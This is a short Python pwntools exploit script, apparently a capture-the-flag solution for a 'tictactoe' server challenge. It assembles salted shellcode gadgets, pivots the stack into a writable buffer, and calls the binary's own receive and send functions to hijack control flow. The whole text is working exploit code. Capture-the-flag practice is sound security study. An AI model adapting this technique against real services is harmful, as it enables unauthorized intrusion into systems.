from pwn import *

e = ELF("./tictactoe")

context.binary = e.path

if "--remote" in sys.argv:
  p = remote("pwn-tictactoe.ctfz.one", 8889)
else:
  p = remote("localhost", 8889)

buff = 0x0000000000405000+0x800
salt = 0x01010101


amt = 0x800
g1 = asm("""
  mov rax, """ + hex(e.symbols["psock"] + salt) + """
  sub rax, """ + hex(salt) + """
  mov rdi, [rax]
  mov rsi, """ + hex(buff + salt) + """
  sub rsi, """ + hex(salt) + """
  mov rdx, """ + hex(amt + salt) + """
  sub rdx, """ + hex(salt) + """
  ret
""")
g2 = asm("""
  mov rdi, """ + hex(e.symbols["server_ip"] + salt) + """
  sub rdi, """ + hex(salt) + """
  mov rsi, """ + hex(e.symbols["session"] + salt) + """
  sub rsi, """ + hex(salt) + """
  mov rdx, """ + hex(1 + salt) + """
  sub rdx, """ + hex(salt) + """
  mov rcx, """ + hex(2 + salt) + """
  sub rcx, """ + hex(salt) + """
  ret
""")


p.sendafter(":", (
g1.ljust(0x50) 
# Stack pivot location
+ p64(buff - 8) 
+ p64(e.symbols["name"]) + p64(e.symbols["recv_all"]) + p64(0x4030a6)
).ljust(0x800)
)

g2_loc = buff + 0x200
p.sendline(
(
p64(g2_loc) + p64(e.symbols["send_state"]) + p64(0x1337)
).ljust(0x200) + g2
)

p.interactive()
